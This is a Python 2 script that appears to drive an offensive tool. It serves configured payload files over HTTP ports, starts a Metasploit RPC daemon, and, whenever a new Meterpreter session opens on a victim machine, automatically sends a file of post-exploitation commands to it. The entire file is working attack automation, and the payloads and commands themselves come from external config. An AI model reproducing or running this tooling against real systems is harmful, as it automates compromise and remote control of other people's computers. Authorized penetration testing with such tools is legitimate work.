import time
import sys
import colorama
import time
import config
from lib.server import PayloadServerThread
from lib.metasploitListener import StartMsfrpcd, MetasploitInteractor
from lib import helpers

if __name__ == '__main__':
	colorama.init(autoreset=True)
	try:
		with open(config.METERPRETER_COMMAND_SCRIPT, 'r') as command_file:
			COMMANDS = command_file.read().splitlines()
	except:
		sys.exit(helpers.color_red('[-] Error: Unable to find file containing meterpreter commands to execute.'))

	print helpers.color_green('[+] Starting payload servers')
	processes = []
	for payload in config.PAYLOADS:
		try:
			process = PayloadServerThread(port=payload['port'], filename=payload['payload'])
			process.setDaemon(True)
			process.start()
			print helpers.color_green('[+] Serving %s on port %d' % (payload['payload'], payload['port']))
			processes.append(process)
		except:
			print helpers.color_red('[-] Unable to serve %s on port %d' % (payload['payload'], payload['port']))
	
	MSFRPCD_PASS = helpers.GeneratePassword(config.MSFRPCD_PASSLENGTH)
	msfrpcd_process = StartMsfrpcd(MSFRPCD_PASS)
	processes.append(msfrpcd_process)
	time.sleep(5)
	
	msfd = MetasploitInteractor(MSFRPCD_PASS,
								config.MSFRPCD_PORT,
								config.METSPLOIT_LPORT,
								config.METASPLOIT_PAYLOAD)
	numsessions = 0
	session_history = []

	while True:

		msf_output = msfd.readconsole()
		if msf_output:
			print msf_output[0]['data']

		sessions_updated = msfd.getsessions(True)
		if len(sessions_updated) > numsessions:
			numsessions = len(sessions_updated)
			msf_output = msfd.readconsole()
			time.sleep(5)
			msfd.sendcommandtosession(1,'')
			for command in COMMANDS:
				print helpers.color_green('[+] Sending command: \"%s\" to Session %d' % (command, len(sessions_updated)))
				print(msfd.sendcommandtosession(len(sessions_updated), command))
				time.sleep(1)
		time.sleep(0.5)

